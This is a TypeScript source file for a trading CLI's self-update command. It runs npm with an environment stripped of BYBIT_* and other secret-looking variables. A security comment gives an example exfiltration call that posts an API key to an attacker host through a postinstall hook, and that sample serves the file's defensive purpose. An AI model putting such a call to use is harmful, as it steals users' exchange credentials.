import { spawn } from 'node:child_process'

/**
 * Sanitize env before spawning npm.
 * SECURITY: npm's postinstall hooks run with the parent's env. If the
 * downloaded package is malicious, any BYBIT_* credentials would be exfiltrated
 * via its postinstall (e.g., `fetch(attacker, {body: process.env.BYBIT_API_KEY})`).
 * We strip BYBIT_* and any secret-looking var before handing env to npm.
 */
function sanitizedEnv(): NodeJS.ProcessEnv {
  const clean: NodeJS.ProcessEnv = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (v === undefined) continue
    if (k.startsWith('BYBIT_')) continue                // BYBIT_API_KEY / BYBIT_API_SECRET / BYBIT_API_PRIVATE_KEY_PATH / etc.
    if (/(SECRET|TOKEN|PASSWORD|APIKEY|API_KEY|CREDENTIAL)/i.test(k)) continue  // catch-all for other services
    clean[k] = v
  }
  return clean
}

/**
 * Run `npm i -g bybit-official-trading-cli@latest` in a subprocess.
 * Inherits stdio so user sees npm's progress and errors directly.
 * Never falls back to internal state — user retains full control.
 * Env is sanitized (see sanitizedEnv above) to prevent credential exfiltration
 * through a malicious downloaded package's postinstall.
 */
export function selfUpdate(dryRun: boolean): void {
  const args = ['i', '-g', 'bybit-official-trading-cli@latest']
  if (dryRun) args.push('--dry-run')

  const child = spawn('npm', args, {
    stdio: 'inherit',
    env: sanitizedEnv(),
  })

  child.on('exit', (code) => {
    if (code !== 0 && code !== null) {
      process.stderr.write('\n')
      if (code === 243 || code === 1) {
        // EACCES / permission errors — common on system-managed Node
        process.stderr.write(
          `❌ npm exit ${code} — likely a permission issue.\n` +
          `   Try either:\n` +
          `     sudo npm i -g bybit-official-trading-cli@latest\n` +
          `     OR install nvm to avoid sudo entirely: https://github.com/nvm-sh/nvm\n`
        )
      } else {
        process.stderr.write(
          `❌ npm exit ${code} — see npm output above for details.\n` +
          `   Also try: bybit-cli self-update --dry-run  (test network/permissions without installing)\n`
        )
      }
    }
    process.exit(code ?? 0)
  })

  child.on('error', (err) => {
    process.stderr.write(`❌ failed to spawn npm: ${err.message}\n`)
    process.exit(1)
  })
}
